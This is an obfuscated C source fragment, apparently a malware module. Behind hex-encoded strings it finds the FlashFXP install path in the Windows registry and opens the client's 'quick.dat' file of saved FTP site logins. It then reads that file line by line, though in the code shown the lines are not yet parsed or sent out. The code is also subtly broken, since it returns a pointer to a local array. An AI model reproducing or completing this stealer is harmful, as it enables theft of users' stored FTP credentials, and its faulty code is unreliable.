
#include "include.h" 
#include "Hell.h"

char line[(0x99d+1870-0x106b)];char*_fipath(){char 
_return[MAX_PATH];LONG _ret;
HKEY _hkey;
DWORD _siz=(0x1672+294-0x1718);
_ret= RegOpenKeyEx(HKEY_CURRENT_USER, "\x53\x6f\x66\x74\x77\x61\x72\x65" "\\" "\x46\x6c\x61\x73\x68\x46\x58\x50" "\\" "\x33" ,(0x1615+3898-0x254f),KEY_READ,&_hkey);
if(	_ret!=ERROR_SUCCESS)
{
	_ret= RegOpenKeyEx(HKEY_LOCAL_MACHINE,"\x53\x6f\x66\x74\x77\x61\x72\x65" "\\" "\x46\x6c\x61\x73\x68\x46\x58\x50" "\\" "\x33" ,(0x1978+3023-0x2547),KEY_READ,&_hkey);
	if(_ret!=ERROR_SUCCESS)
		return "\x4e\x4f\x5f\x49\x4e\x53\x54\x41\x4c\x4c";
	else _ret= RegQueryValueEx(_hkey,"\x49\x6e\x73\x74\x61\x6c\x6c\x20\x50\x61\x74\x68",(0x21a9+339-0x22fc),NULL,(LPBYTE)_return,&_siz);
}
else _ret=RegQueryValueEx(_hkey,"\x49\x6e\x73\x74\x61\x6c\x6c\x20\x50\x61\x74\x68",(0x9e2+3162-0x163c),NULL,(LPBYTE)_return,&_siz);
if(_ret!=ERROR_SUCCESS)
{
	return "\x4e\x4f\x5f\x49\x4e\x53\x54\x41\x4c\x4c";
}
else
{
	RegCloseKey(_hkey);
	return&_return[(0x1669+3563-0x2454)];
}
}
int FlashFXP(int parse) 
{
	char buf[MAX_PATH];
	FILE*qd;
	strcpy(buf,_fipath());
	if(!strcmp(buf,	"\x4e\x4f\x5f\x49\x4e\x53\x54\x41\x4c\x4c"))
		return(0x15f2+728-0x18ca);
	else 
		strcat(buf,"\\" "\x71\x75\x69\x63\x6b\x2e\x64\x61\x74");
	qd= fopen(buf,"\x72");
	if(qd==NULL)
		return(0x1dfd+348-0x1f59);
	else{
		if(!parse)
		{
			fclose(qd);
			return(0x324+937-0x6cc);
		}
		else
		{
			while(fgets(line,(0xd74+1131-0x115f),qd)!=NULL)
			{
				Sleep((0xa01+860-0x58d));
			}
			fclose(qd);
			return(0x1168+4880-0x2477);
		}
	}
}
